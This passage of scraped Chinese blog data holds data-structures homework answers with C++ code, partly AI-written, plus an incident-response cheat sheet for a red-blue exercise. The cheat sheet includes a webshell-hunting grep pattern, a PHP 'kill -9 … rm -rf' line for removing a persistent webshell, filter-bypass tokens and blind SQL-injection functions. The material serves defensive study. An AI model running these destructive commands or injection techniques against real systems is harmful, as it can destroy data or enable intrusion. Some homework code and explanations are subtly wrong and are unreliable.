才能适应不断发展的需要。而顺序表的插入、删除的效率低,故不合适。\n作业Ch2-4:算法设计：在顺序表中删除所有元素值为x的元素，要求空间复杂度为O(1)，给出算法伪代码和源代码。\n\nai加自己写的，有两个方法，第一个方法比较好一些\n\n伪代码法一输入：顺序表data，元素x输出：删除所有值为x的元素后的顺序表1. 初始化一个新的索引j为02. 对于顺序表data中的每个元素，执行以下操作：   1. 如果当前元素不等于x，则将当前元素复制到j位置，并将j增加13. 将顺序表data的长度设置为j\n\n法二输入：顺序表data，元素x输出：删除所有值为x的元素后的顺序表1. 对于顺序表data中的每个元素，执行以下操作：   1. 如果当前元素等于x，则执行以下操作：      1. 对于从当前元素到倒数第二个元素的每个元素，将下一个元素复制到当前位置      2. 将顺序表data的长度减1      3. 将当前索引减1（因为删除了元素）\n\n源代码#include &lt;iostream&gt;#include &lt;random&gt;#include &lt;chrono&gt;using namespace std;const int MaxSize = 100;            //100只是示例性的数据，根据实际问题具体定义template &lt;class DataType&gt;          //定义模板类SeqListclass SeqList&#123;public:    SeqList();                     //无参构造函数，建立空的顺序表    SeqList(DataType a[], int n);      //有参构造函数，建立长度为n的顺序表    ~SeqList();                    //析构函数    DataType Delete(int i);            //删除操作，删除第i个元素    void PrintList();                 //遍历操作，按序号依次输出各元素private:    DataType data[MaxSize];          //存放数据元素的数组    int length;                       //线性表的长度&#125;;template &lt;class DataType&gt;DataType SeqList&lt;DataType&gt; ::Delete(int x)&#123;   /*这段代码遍历顺序表，每次遇到值不等于x的元素时，就将其复制到新的位置。最后，它将顺序表的长度设置为新的长度。这个算法的空间复杂度是O(1)，因为它只使用了固定数量的额外空间。*/    int j = 0;    for (int i = 0; i &lt; length; i++)    &#123;        if (data[i] != x)        &#123;            data[j] = data[i];            j++;        &#125;            &#125;    length = j;    return x;    /*    这个有两种做法，还有一种是直接删除。每次遇到值为x的元素时，就将其删除。但是，这种方法的时间复杂度是O(n^2)，因为每次删除操作都需要O(n)的时间。    for (int i = 0; i &lt; length; i++)    &#123;        if (data[i] == x)        &#123;            for (int j = i; j &lt; length - 1; j++)            &#123;                data[j] = data[j + 1];            &#125;            length--;            i--;  // 因为删除了元素，所以需要将索引减1        &#125;    &#125;*/&#125;template&lt;class DataType&gt;SeqList&lt;DataType&gt; :: ~SeqList()&#123;&#125;template &lt;class DataType&gt;SeqList&lt;DataType&gt; ::SeqList()&#123;    length = 0;&#125;template &lt;class DataType&gt;SeqList&lt;DataType&gt; ::SeqList(DataType a[], int n)&#123;    if (n &gt; MaxSize)        throw &quot;参数非法&quot;;    for (int i = 0; i &lt; n; i++)        data[i] = a[i];    length = n;&#125;template &lt;class DataType&gt;void SeqList&lt;DataType&gt; ::PrintList()&#123;    for (int i = 0; i &lt; length; i++)        cout &lt;&lt; data[i]&lt;&lt;&quot; &quot;;                   //依次输出线性表的元素值&#125;    /*                   _ooOoo_                  o8888888o                  88&quot; . &quot;88                  (| -_- |)                  O\\  =  /O               ____/`---&#x27;\\____            .&#x27;  \\\\|     |//  `.            /  \\\\|||  :  |||//  \\           /  _||||| -:- |||||-  \\           |   | \\\\\\  -  /// |   |           | \\_|  &#x27;&#x27;\\---/&#x27;&#x27;  |   |           \\  .-\\__  `-`  ___/-. /         ___`. .&#x27;  /--.--\\  `. . __      .&quot;&quot; &#x27;&lt;  `.___\\_&lt;|&gt;_/___.&#x27;  &gt;&#x27;&quot;&quot;.     | | :  `- \\`.;`\\ _ /`;.`/ - ` : | |     \\  \\ `-.   \\_ __\\ /__ _/   .-` /  /======`-.____`-.___\\_____/___.-`____.-&#x27;======                   `=---=&#x27;^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^    佛祖保佑       永不宕机     永无BUG*/int main()&#123;    // 使用当前时间作为随机数生成器的种子    unsigned seed = chrono::system_clock::now().time_since_epoch().count();    // 创建一个随机数生成器    default_random_engine generator(seed);    // 创建一个均匀分布的随机数生成器，范围从1到100    uniform_int_distribution&lt;int&gt; distribution(1, 10);    int maxsize;    cout &lt;&lt; &quot;请输入你要创建表的大小&quot; &lt;&lt; endl;    cin &gt;&gt; maxsize;    int* a = new int[maxsize];    for (int i = 0; i &lt; maxsize; i++)    &#123;        a[i] = distribution(generator);//赋值    &#125;    cout &lt;&lt; &quot;已创建一个最大长度&quot; &lt;&lt; maxsize &lt;&lt; &quot;的顺序表&quot; &lt;&lt; endl;    SeqList&lt;int&gt; L&#123; a, maxsize &#125;;    cout &lt;&lt; &quot;*******执行遍历链表******&quot; &lt;&lt; endl;    L.PrintList();    cout &lt;&lt; endl;    cout &lt;&lt; &quot;**************************&quot; &lt;&lt; endl;    cout &lt;&lt; &quot;请输入你要删除的数据&quot; &lt;&lt; endl;    int del;    cin &gt;&gt; del;    cout &lt;&lt; &quot;删除的数据是&quot; &lt;&lt; L.Delete(del) &lt;&lt; endl;    cout &lt;&lt; &quot;*******执行遍历链表******&quot; &lt;&lt; endl;    L.PrintList();    cout &lt;&lt; endl;    cout &lt;&lt; &quot;**************************&quot; &lt;&lt; endl;    return 0;&#125;\n\n作业Ch2-5:算法设计：已知单链表中各结点的元素值为整型且递增有序，设计算法删除链表中大于mink且小于maxk的所有元素，并释放被删结点的存储空间，给出算法伪代码和源代码。\n这个也是借助ai加自己写的，就加了一个条件判断，另外还需要加强一下头插法尾插法的算法，不熟练\n\n伪代码1. 定义一个模板函数Delete，接受两个参数mink和maxk。2. 初始化两个指针p和q，其中p指向链表的第一个节点，q指向头节点。3. 进入一个while循环，条件是p不为空。   - 如果p指向的节点的数据在mink和maxk之间，则删除该节点，并将q的next指针指向p的next节点。然后更新p为q的next节点。   - 如果p指向的节点的数据不在mink和maxk之间，则将q更新为p，然后将p更新为p的next节点。4. 循环结束后，所有在mink和maxk之间的节点都被删除。\n\n源代码#include &lt;iostream&gt;                  //引入输入输出流#include &lt;random&gt;#include &lt;chrono&gt;using namespace std;template &lt;typename DataType&gt;struct Node&#123;    DataType data;               //数据域    Node&lt;DataType&gt;* next;       //指针域&#125;;template &lt;typename DataType&gt;class LinkList&#123;public:    LinkList();                      //无参构造函数，建立只有头结点的空链表    LinkList(DataType a[], int n);       //有参构造函数，建立有n个元素的单链表    ~LinkList();                     //析构函数    void Delete(int mink, int maxk);    void PrintList();                  //遍历操作，按序号依次输出各元素private:    Node&lt;DataType&gt;* first;           //单链表的头指针&#125;; template &lt;typename DataType&gt;void LinkList&lt;DataType&gt; ::Delete(int mink,int maxk)&#123;    DataType x;    Node&lt;DataType&gt;* p = first-&gt;next, * q = first;        //工作指针p指向头结点    while (p != nullptr)    &#123;        if ((p-&gt;data&lt;maxk) &amp;&amp;(p-&gt;data&gt;mink) )        &#123;            q-&gt;next = p-&gt;next;            delete p;            p = q-&gt;next;        &#125;        else        &#123;            q = p;            p = p-&gt;next;                    &#125;    &#125;&#125;template &lt;typename DataType&gt;LinkList&lt;DataType&gt; ::LinkList()&#123;    first = new Node&lt;DataType&gt;;              //生成头结点    first-&gt;next = nullptr;                      //头结点的指针域置空&#125;template &lt;class DataType&gt;LinkList&lt;DataType&gt; :: ~LinkList()&#123;    Node&lt;DataType&gt;* q = NULL;    while (first != NULL)        //释放单链表的每一个结点的存储空间    &#123;        q = first;                 //暂存被释放结点        first = first-&gt;next;         // first指向被释放结点的下一个结点        delete q;    &#125;&#125;template &lt;typename DataType&gt;void LinkList&lt;DataType&gt; ::PrintList()&#123;    Node&lt;DataType&gt;* p = first-&gt;next;                //工作指针p初始化    while (p != nullptr)    &#123;        cout &lt;&lt; p-&gt;data &lt;&lt; &quot;\\t&quot;;        p = p-&gt;next;                 //工作指针p后移，注意不能写作p++    &#125;&#125;//尾插法构造template &lt;typename DataType&gt;LinkList&lt;DataType&gt; ::LinkList(DataType a[], int n)&#123;    first = new Node&lt;DataType&gt;;                    //生成头结点    Node&lt;DataType&gt;* r = first, * s = nullptr;           //尾指针初始化    for (int i = 0; i &lt; n; i++)    &#123;        s = new Node&lt;DataType&gt;; s-&gt;data = a[i];        r-&gt;next = s; r = s;                 //将结点s插入到终端结点之后    &#125;    r-&gt;next = nullptr;        //单链表建立完毕，将终端结点的指针域置空&#125;int main()&#123;    int maxsize;    cout &lt;&lt; &quot;请输入你要创建表的大小&quot; &lt;&lt; endl;    cin &gt;&gt; maxsize;    int* a = new int[maxsize];    for (int i = 0; i &lt; maxsize; i++)    &#123;        a[i] = i;    &#125;    cout &lt;&lt; &quot;已创建一个最大长度&quot; &lt;&lt; maxsize &lt;&lt; &quot;的单链表&quot; &lt;&lt; endl;    LinkList&lt;int&gt; L&#123; a, maxsize &#125;;    cout &lt;&lt; &quot;*******执行遍历链表******&quot; &lt;&lt; endl;    L.PrintList();    cout &lt;&lt; endl;    cout &lt;&lt; &quot;**************************&quot; &lt;&lt; endl;    cout &lt;&lt; &quot;请输入左右界定范围mink和maxk&quot; &lt;&lt; endl;    int mink, maxk;    cin &gt;&gt; mink &gt;&gt; maxk;    cout &lt;&lt; &quot;**************************&quot; &lt;&lt; endl;    L.Delete(mink, maxk);    cout &lt;&lt; &quot;题解删除操作已执行完毕&quot; &lt;&lt; endl;    cout &lt;&lt; &quot;*******执行遍历链表******&quot; &lt;&lt; endl;    L.PrintList();    cout &lt;&lt; endl;    cout &lt;&lt; &quot;**************************&quot; &lt;&lt; endl;&#125;\n\n","categories":["学习笔记","数据结构作业","课后作业"],"tags":["数据结构作业"]},{"title":"DS作业-4-Ch3-22网安物联网-20230927","url":"/posts/4311d78.html","content":"\n声明：仅供留档查阅，仅用作起到提示引导性作用，仅用作学习交流，切勿直接照搬\n\nCh3-1.总结栈空、栈满、队空、队满的判定条件。\n栈和队列是两种常见的数据结构，它们的空和满的判断条件如下：\n栈：\n\n栈空：当栈顶指针top等于-1时，表示栈为空。\n栈满：当栈顶指针top等于栈的最大容量减1（假设栈的最大容量为maxSize）时，表示栈已满，即top == maxSize - 1。\n\n队列：\n\n队空：当队头指针front等于队尾指针rear时，表示队列为空。\n队满：这个判断条件取决于你如何实现队列。如果你使用数组实现循环队列，那么当(rear + 1) % maxSize == front时，表示队列已满（假设队列的最大容量为maxSize）。这里的 % 是取余运算，用于实现循环。\n\nCh3-2. 循环队列的优点是什么？设用数组来存放循环队列，你有几种判断队满和队空的方案？\n循环队列的优点主要有以下几点：\n\n有效利用空间：在普通队列中，当队尾指针到达数组的末端时，即使数组的前端还有空闲空间，也无法再添加新的元素。而循环队列通过将队列的首尾相连，形成一个循环，使得在队尾指针到达数组末端时，可以从数组前端继续添加新的元素，从而更有效地利用了空间。\n避免数据迁移：在普通队列中，每次出队操作后，为了维持队列的连续性，需要将所有元素向前移动一位，这会消耗大量的时间和计算资源。而在循环队列中，通过移动队头和队尾指针来实现入队和出队操作，无需移动元素本身，因此效率更高。\n\n对于使用数组实现的循环队列，常见的判断队满和队空的方案有以下几种：\n\n牺牲一个存储空间：这是最常见的方法。当(rear + 1) % maxSize == front时，判断队列已满；当rear == front时，判断队列为空。这种方法的缺点是会浪费一个数组的存储空间。\n使用一个标志位：除了使用front和rear两个指针外，还可以额外使用一个标志位来判断队列的状态。当入队操作后rear == front时，将标志位设为满；当出队操作后rear == front时，将标志位设为空。这种方法可以充分利用所有存储空间，但需要额外的标志位。\n记录元素个数：除了使用front和rear两个指针外，还可以使用一个计数器来记录队列中元素的个数。当计数器为0时，判断队列为空；当计数器等于数组大小时，判断队列已满。这种方法同样可以充分利用所有存储空间，但需要额外的计数器。\n\nCh3-3.*假设以带头结点的循环单链表表示队列，并且只设一个尾指针NodeRear 指向队尾结点（没有队头指针Node front），试编写入队和出队算法。*\n\n自己写的，目前还在报错，修改中……\n已完工\n\n#include &lt;iostream&gt;                  //引入输入输出流using namespace std;template &lt;typename DataType&gt;struct Node&#123;    DataType data;               //数据域    Node&lt;DataType&gt;* next;       //指针域&#125;;template &lt;typename DataType&gt;class LinkList_Queue&#123;public:    LinkList_Queue();                      //无参构造函数，建立只有头结点的空链表    ~LinkList_Queue();                     //析构函数    int Empety();    DataType Push(DataType x);       //插入操作，第i个位置插入值为x的结点    DataType Pop();            private:    Node&lt;DataType&gt;* first, * rear;           //单链表的头指针&#125;;template &lt;typename DataType&gt;LinkList_Queue&lt;DataType&gt; ::LinkList_Queue()&#123;    Node&lt;DataType&gt;* s = nullptr;    s = new Node&lt;DataType&gt;;        s-&gt;next = nullptr;    first = rear = s;                      //头结点的指针域置空&#125;template &lt;class DataType&gt;LinkList_Queue&lt;DataType&gt; :: ~LinkList_Queue()&#123;&#125;template &lt;typename DataType&gt;int LinkList_Queue&lt;DataType&gt; ::Empety()&#123;    if (first == rear)        return 1;    else        return 0;&#125;//入队算法template &lt;typename DataType&gt;DataType LinkList_Queue&lt;DataType&gt; ::Push(DataType x)&#123;    Node&lt;DataType&gt;* s = nullptr;               s = new Node&lt;DataType&gt;;     s-&gt;data = x;    s-&gt;next = nullptr;    rear-&gt;next = s;    rear = s;    return x;&#125;//出队算法template &lt;typename DataType&gt;DataType LinkList_Queue&lt;DataType&gt; ::Pop()&#123;    if (first == rear )    &#123;        cout &lt;&lt; &quot;队空&quot; &lt;&lt; endl;        return 0;    &#125;    else    &#123;        DataType x;        Node&lt;DataType&gt;* p = first-&gt;next;        x = p-&gt;data;        first-&gt;next = p-&gt;next;        if (rear == p)  // 如果队列中只有一个元素            rear = first;  // 则需要更新尾指针        delete p;        return x;    &#125;&#125;int main()&#123;    LinkList_Queue&lt;int&gt; s = &#123;&#125;;    int a = 0;    s.Push(1);    s.Push(2);    s.Push(3);    cout &lt;&lt; &quot;已入队1,2,3&quot; &lt;&lt; endl;    cin &gt;&gt; a;    cout &lt;&lt; &quot;已入队：&quot; &lt;&lt; s.Push(a) &lt;&lt; endl;    cout &lt;&lt; &quot;出队一次&quot;&lt;&lt; endl;    cout &lt;&lt; &quot;已出队：&quot; &lt;&lt; s.Pop() &lt;&lt; endl;    cout &lt;&lt; &quot;已出队：&quot; &lt;&lt; s.Pop() &lt;&lt; endl;    cout &lt;&lt; &quot;已出队：&quot; &lt;&lt; s.Pop() &lt;&lt; endl;    cout &lt;&lt; &quot;已出队：&quot; &lt;&lt; s.Pop() &lt;&lt; endl;    return 0;&#125;\n\n\n\n\nAI生成的，不想做了，谨慎查阅\n\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;// 定义结点typedef struct Node &#123;    int data;    struct Node* next;&#125; Node;// 定义队列typedef struct Queue &#123;    Node* rear;&#125; Queue;// 初始化队列Queue* initQueue() &#123;    Node* head = (Node*)malloc(sizeof(Node));  // 创建头结点    head-&gt;next = head;  // 循环链表    Queue* queue = (Queue*)malloc(sizeof(Queue));    queue-&gt;rear = head;  // 尾指针指向头结点    return queue;&#125;// 入队操作void enQueue(Queue* queue, int data) &#123;    Node* newNode = (Node*)malloc(sizeof(Node));    newNode-&gt;data = data;    newNode-&gt;next = queue-&gt;rear-&gt;next;  // 新结点指向头结点    queue-&gt;rear-&gt;next = newNode;  // 尾结点指向新结点    queue-&gt;rear = newNode;  // 更新尾指针&#125;// 出队操作int deQueue(Queue* queue) &#123;    if (queue-&gt;rear == queue-&gt;rear-&gt;next) &#123;        printf(&quot;队列为空，无法出队。\\n&quot;);        return -1;    &#125;    Node* head = queue-&gt;rear-&gt;next;  // 头结点    Node* firstNode = head-&gt;next;  // 第一个结点（即要出队的结点）    int data = firstNode-&gt;data;    head-&gt;next = firstNode-&gt;next;  // 头结点指向第二个结点    if (firstNode == queue-&gt;rear) &#123;  // 如果只有一个元素，出队后更新尾指针        queue-&gt;rear = head;    &#125;    free(firstNode);  // 释放出队的结点内存    return data;&#125;int main() &#123;    Queue* queue = initQueue();        printf(&quot;入队：\\n&quot;);    for (int i = 1; i &lt;= 5; i++) &#123;        printf(&quot;%d &quot;, i);        enQueue(queue, i);    &#125;        printf(&quot;\\n出队：\\n&quot;);    for (int i = 1; i &lt;= 5; i++) &#123;        printf(&quot;%d &quot;, deQueue(queue));    &#125;        return 0;&#125;\n\n","categories":["学习笔记","数据结构作业","课后作业"],"tags":["数据结构作业"]},{"title":"DS作业-5-22网安物联网-20231016","url":"/posts/9b8045c.html","content":"作业ch4-1：\n（1）\n从主串S的第一个字符’a’开始，与模式串T的第一个字符’b’进行比较，发现不相等。\n从主串S的第二个字符’b’开始，与模式串T进行比较，发现前三个字符’b’, ‘a’, ‘b’相等，但第四个字符’a’与模式串T的第四个字符’b’不相等。\n从主串S的第三个字符’c’开始，与模式串T进行比较，发现第一个字符不相等。\n以此类推，直到从主串S的第12个字符’b’开始，与模式串T进行比较，发现五个字符’b’, ‘a’, ‘b’, ‘a’, ‘b’全部相等，说明找到了一个匹配。\n所以位置是12\n（2）\n\n\n\nj\n0\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\nT[j]\na\nb\nc\na\na\nb\nb\nc\na\na\na\nb\na\nb\na\nb\na\na\nb\nc\na\n\n\nnext[j]\n-1\n0\n0\n0\n1\n1\n2\n0\n0\n1\n1\n1\n2\n1\n2\n1\n2\n1\n1\n2\n0\n\n\n（3）\nS[0]与T[0]不匹配，移动模式串到S[1]。\nS[1]与T[0]不匹配，移动模式串到S[2]。\n以此类推，一直到S[4]和T[0]不匹配\n移动模式串到S[1]\n以此类推，当遇到不匹配时，回退到T[next[j]]的位置\n作业ch4-2：\nStatus AddSMatrix(TSMatrix &amp;C, TSMatrix A, TSMatrix B) &#123;  C.mu = A.mu;  C.nu = A.nu;  int i = 0, m = 0, n = 0;  while (m &lt; A.tu &amp;&amp; n &lt; B.tu) &#123;    if (A.data[m].row &lt; B.data[n].row) &#123;      C.data[i] = A.data[m];      i++;      m++;    &#125; else if (A.data[m].row &gt; B.data[n].row) &#123;      C.data[i] = B.data[n];      i++;      n++;    &#125; else if (A.data[m].row == B.data[n].row) &#123;      if (A.data[m].col == B.data[n].col) &#123;        C.data[i].item = A.data[m].item + B.data[n].item;        C.data[i].row = A.data[m].row;        C.data[i].col = A.data[m].col;        m++;        n++;        i++;      &#125; else if (A.data[m].col &gt; B.data[n].col) &#123;        C.data[i] = B.data[n];        i++;        n++;      &#125; else if (A.data[m].col &lt; B.data[n].col) &#123;        C.data[i] = A.data[m];        i++;        m++;      &#125;    &#125;  &#125;  C.tu = i + 1;&#125;\n\n作业ch4-3：\nk&#x3D;(j-1)*(2n-j+2)&#x2F;2+(i-j)\n作业ch4-4：\n(1) A0000的地址为：100 + 2 × (0 × 3 × 5 × 8 + 0 × 5 × 8 + 0 × 8 + 0) &#x3D; 100\n(2) A1111的地址为：100 + 2 × (1 × 3 × 5 × 8 + 1 × 5 × 8 + 1 × 8 + 1) &#x3D; 284\n(3) A3125的地址为：100 + 2 × (3 × 3 × 5 × 8 + 1 × 5 × 8 + 2 × 8 + 5) &#x3D; 892\n(4) A8247的地址为：100 + 2 × (8 × 3 × 5 × 8 + 2 × 5 × 8 + 4 × 8 +7) &#x3D; 2446\n作业ch4-5：\n在广义表中，GetHead操作返回广义表的第一个元素，而GetTail操作返回除第一个元素外的剩余部分。所以，对于给定的广义表，我们有：\n(1) GetHead((p,h,w)) 的结果是 p。\n(2) GetTail((p,h,w)) 的结果是 (h,w)。\n(3) GetHead(((a,b),(c,d))) 的结果是 (a,b)。\n(4) GetTail(((a,b),(c,d))) 的结果是 ((c,d))。\n(5) GetHead(GetTail(((a,b),(c,d)))) 的结果是 (c,d)。\n(6) GetTail(GetHead(GetTail(((a,b),(c,d))))) 的结果是 ()，因为(c,d)没有尾部。\n","categories":["学习笔记","数据结构作业","课后作业"],"tags":["数据结构作业"]},{"title":"DS作业-7-Ch5-22网安物联网-20231113","url":"/posts/527dba8e.html","content":"图片加载不出来请点开看\n\n11题\n假设用于通讯的电文由 8 个字母组成，ABCDEFGH ，字母在电文中 的出现频率分别为 0.07,0.19,0.02,0.06,0.32,0.03,0.21,0.10,试设计 Huffman 编码。\n\n\nbing写的……\n\n以下是一个使用C++实现Huffman编码的代码，这个代码创建了一个Huffman树，并为每个字符生成了一个二进制编码。这个代码更加简洁，适合初学者理解：\n#include &lt;iostream&gt;using namespace std;struct ElemType &#123;    int weight;    int parent, lchild, rchild;&#125;;class HuffmanTree &#123;public:    HuffmanTree(int w[], int n);    void Print();private:    ElemType *huffTree;    int num;    void Select(int n, int &amp;i1, int &amp;i2);&#125;;void HuffmanTree::Select(int n, int &amp;i1, int &amp;i2) &#123;    int i = 0, temp;    for (; i &lt; n; i++)        if (huffTree[i].parent == -1) &#123;i1 = i; break;&#125;    for (i = i + 1; i &lt; n; i++)        if (huffTree[i].parent == -1) &#123;i2 = i;break;&#125;        if (huffTree[i1].weight &gt; huffTree[i2].weight) &#123;        temp = i1; i1 = i2;i2 = temp;    &#125;    for (i = i + 1; i &lt; n; i++) &#123;        if (huffTree[i].parent == -1) &#123;            if (huffTree[i].weight &lt; huffTree[i1].weight) &#123;                i2 = i1; i1 = i;            &#125;            else if (huffTree[i].weight &lt; huffTree[i2].weight) &#123;                i2 = i;            &#125;        &#125;    &#125;    &#125;HuffmanTree::HuffmanTree(int w[], int n) &#123;    int i, k, i1, i2;    huffTree = new ElemType [2*n-1];    num = n;    for (i = 0; i &lt; 2*num-1; i++) &#123;        huffTree[i].parent = -1;        huffTree[i].lchild = huffTree[i].rchild = -1;    &#125;    for (i = 0; i &lt; num; i++) &#123;        huffTree[i].weight = w[i];    &#125;    for (k = num; k &lt; 2*num-1; k++) &#123;        Select(k, i1, i2);        huffTree[k].weight = huffTree[i1].weight + huffTree[i2].weight;        huffTree[i1].parent = k; huffTree[i2].parent = k;         huffTree[k].lchild = i1; huffTree[k].rchild = i2;    &#125;&#125;void HuffmanTree::Print() &#123;    int i, k;    cout &lt;&lt; &quot;每个叶子到根结点的路径是:&quot; &lt;&lt; endl;     for (i = 0; i &lt; num; i++) &#123;        cout &lt;&lt; huffTree[i].weight;        k = huffTree[i].parent;        while (k != -1) &#123;            cout &lt;&lt; &quot;--&gt;&quot; &lt;&lt; huffTree[k].weight;            k = huffTree[k].parent;        &#125;        cout &lt;&lt; endl;    &#125;&#125;int main() &#123;    int w[] = &#123;7, 19, 2, 6, 32, 3, 21, 10&#125;;    HuffmanTree T(w, 8);    T.Print();    return 0;&#125;\n\n这段代码首先计算每个字符的频率，然后使用优先队列（最小堆）来创建Huffman树。然后，它遍历Huffman树以生成Huffman编码。最后，它打印出每个字符及其对应的Huffman编码。\n请注意，这只是一个基本的实现，可能需要根据您的具体需求进行修改和优化。例如，您可能需要将字符频率作为输入参数，而不是在代码中硬编码。此外，这个代码没有进行错误处理，也没有释放动态分配的内存。在实际使用中，您需要确保代码的健壮性和效率。\n","categories":["学习笔记","数据结构作业","课后作业"],"tags":["数据结构作业"]},{"title":"Docker容器的学习","url":"/posts/dc51af4b.html","content":"","categories":["Docker"],"tags":["Docker","容器原理"]},{"title":"Github-actions学习的坎坷","url":"/posts/adaea106.html","content":"前言事情是这样的，在昨天，也就是 2024 年 4 月 20 日，我突然发现了探姬师傅的Hello-CTF 中的工作流，虽然我看不懂，但是能大概猜出是什么意思，凑巧我又刷到了另一位大佬的项目，爱飞的鸟的博客的友链申请仓库，也是一个应用的 Github actions 工作流，于是我想我能不能也做一个工作流，实现我全自动化的博客部署和友链申请，再者，我手里还有个Easy-QFNU的项目，我也可以借鉴一下，毕竟我现在的刷新时间操作还是需要半人工操作的，虽然有很方便的脚本，但是我还想用工作流，实现全自动化，这样就不用人工来启动脚本了。\n正文说干就干，今天早上我起床吃饭之后就来实验室了，折腾了一下午，毫无进展，我一开始向 ChatGPT 求助，企图让他帮我直接写出脚本来，他的能力我还是挺认可的，但是结局不尽人意，我几乎一整天都在折腾这个 Github actions 工作流，从 12 点搞到晚上八点，没有任何进步。\n已经不想说什么了，放几张图吧\n\n\n\n\n\n\n这些差不多是十分之一的 ChatGPT 的输出，我已经不想再继续了，除此之外，我还问了 copilot，Gemini，Claude3。。。n 个 AI，都没有帮上忙，我只能自己摸索了。\n开始看文档无奈之下我只好回归了本心，自己看文档自己动手\n\n映入眼帘的英文啊，这对我一个四级都没过的人来说是莫大的痛苦，没办法，看呗\n看了半天，大体看懂，但是不会写。\n去搜一点别的，找到了ithub 中文社区，这里有一个 Github actions 的教程，看了一下，跟着来了一遍，成功了，测试要通过了。\n\n\n说到底，还得是实操，光有理论啥也不是，只有实践才能学会。\n\n目前的话是已经能正常输出语句了，但是中间的算法还没实现，只能等到下次有空再继续了\n\n哎，今天因为这个，浪费了大量时间，不过好在学到了一些东西，也不算白浪费。\n\n","categories":["Github"],"tags":["Github-actions","Github"]},{"title":"HW","url":"/posts/8c7613a5.html","content":"HWHWlinux 系统\n\n首先查看一下基础信息\nnetstat -ano&#x2F;-a #查看端口情况\nuname -a #系统信息\nps -aux ps -ef #进程信息\ncat &#x2F;etc&#x2F;passwd #用户情况\nls &#x2F;home&#x2F; #用户情况\n\n查看日志文件\n\n&#x2F;var&#x2F;log&#x2F;nginx&#x2F; #默认 Nginx 日志目录&#x2F;var&#x2F;log&#x2F;apache&#x2F; #默认 Apache 日志目录&#x2F;var&#x2F;log&#x2F;apache2&#x2F; #默认 Apache 日志目录&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;logs #Tomcat 日志目录\n\ntail -f xxx.log #实时刷新滚动日志文件\n通过命令查看可疑文件\n\nfind &#x2F;var&#x2F;www&#x2F;html -name .php -mmin -20 #查看最近 20 分钟修改文件find .&#x2F; -name ‘.php’ | xargs wc -l | sort -u #寻找行数最短文件grep -r –include&#x3D;.php ‘[^a-z]eval($_POST’ &#x2F;var&#x2F;www&#x2F;html #查包含关键字的 php 文件find &#x2F;var&#x2F;www&#x2F;html -type f -name “.php” | xargs grep “eval(“ |more\n\n不死马查杀命令（只是临时解决方案，彻底解决请重启服务器）\n&lt;?php system(&quot;kill -9 pid;rm -rf .shell.php&quot;); ?&gt;  #pid和不死马名称根据实际情况定\n后门用户查杀：UID 大于 500 的都是非系统账号，500 以下的都为系统保留的账号，使用 userdel -r username 完全删除账户\n通过主机安全和态势感知发现告警，这类发现告警的话是可以定位到具体的时间的，根据发生时间来上级排查，定位该时间段内服务器上有做修改的文件，可以快速排查到是否存在 webshell 文件\nwindows 系统\n\n首先排查 windows 日志查看可疑时间段内的操作，查看 windows 日志方法（通过运行命令。按下“Win+R”键打开运行窗口，输入“eventvwr.msc”后按回车键），需要重点排查的内容是，在被攻击的时间段内的文件打开记录. 自启动运行记录. 软件运行记录，通过排查日志来清理入侵者上传的后门等文件[图片]\n\n排查目前的进程，按住 Ctrl+Shift+esc 可以打开任务管理器，需要观察的是占用网络比较大的进程，可以按照网络排序查看是否有占用流量比较大的的进程，右键可以定位到该文件在磁盘中的物理位置，查看可疑文件的创建时间来判断是否为攻击者上传的文件（这个时间也可以修改的，只能作为参考，并不代表创建时间较老就不是攻击者上传的文件）[图片]\n\n查看系统自启动项（通过运行命令。按下“Win+R”键打开运行窗口，输入“msconfig.exe”后按回车键）需要查看的是服务这里面是否有可疑的自启动项，这里面显示的是在开机的时候会自动运行的命令，如果被攻击的话可能在这里看到是否有攻击者为了维持权限添加的自启动项，从而定位到木马文件。[图片]\n\n查看系统用户是否存在影子用户，打开注册表查看 KEY_LOCAL_MACHINE&#x2F;SAM&#x2F;SAM&#x2F;Domains&#x2F;Account&#x2F;Users&#x2F;下是否存在陌生账户，及时删除。影子账户：通过修改注册表内用的 abc$值和已存在用户abc$的相同的手段，可以实现 net user 命令看不到用户；用户管理窗口也看不到用户；只可以通过注册表查看到该用户，攻击者可以利用该账号直接登录到系统\n\n\n安全设备雷池 waf https://waf-ce.chaitin.cn/\n报警\n绝大部分攻击流量都是 http，web 层面，看流量包研判\n其他的应用绝大部分都是密码暴破 mysql，rdp，ssh，mssql，redis 等\n常见协议的端口\n简单的 payload扫描器的 payload，sql 注入，xss，xxe，ssti，命令注入，代码注入，请求走私，反弹 shell，webshell 上传\n复杂的 payload反序列化 payload，编码 payload，webshell 通信\n常见的绕过，{IFS}，%00，/\\*\\*/，0x1212123213\n溯源网络层面安全设备的记录，态势感知，日志审计，定位源 ip\n定位真实 ip：社工，攻击者工具漏洞，蜜罐\n主机层面用户登录记录，突然多出来的用户，隐藏用户\n进程特权进程，隐藏进程，资源占用比较高的进程\n网络连接本机和其他机器建立的连接，dns 隧道\n微步在线 IP 和域名是否是恶意的 https://x.threatbook.com/\n常见的持久化手段webshell，ssh 后门，icmp 隧道，dns 隧道等\n主要的 Web 漏洞Sql 注入原理：网站数据过滤不严格，过分信赖用户输入的数据, 没有过滤用户输入的恶意数据，无条件的把用户输入的数据当作 SQL 语句执行，因此导致 sql 注入漏洞产生\nSql 注入分类：\n\n以有无闭合字符分类：字符型. 整数型\n以数据传输方式分类：post 类型. get 类型\n注入方式细分：联合查询注入. 报错型注入. 布尔型盲注. 时间型盲注. 宽字节注入\n\n报错注入常用函数：UpdateXML() . Floor(). Extractvalue()\nmysql 默认存在的哪个数据库，注入时经常用到？\n\nInformation_schema\n\n时间型盲注特点？常用函数？易受到什么影响？\n\n场景：应用于无数据回显，无报错，布尔型盲注失效后\n\n特点：时间型盲注页面没有明显的回显，只能根据页面刷新时间的长短来去判断构造语句是否正确；\n\n常用函数: sleep 函数 if 条件语句 等\n\n易受网络波动影响\n\n\n布尔型盲注特点?常用函数？\n\n特点:根据页面正确和错误的两种状态，来判断构造语句是否正确\n\n常用函数：\n\nlength() #用以猜测数据返回字符串的长度\nSunstr() #截取字符串\nMid() #取出字符串的一部分值\nLeft() #取出字符串左边的几个数据\nAscii() #返回一个字符的 ascii 码值\n\n\n\nsql 手注的一般步骤\n\n判断注入点\n\n判断注入类型\n\n判断注入点提交方式\n\n使用 order by 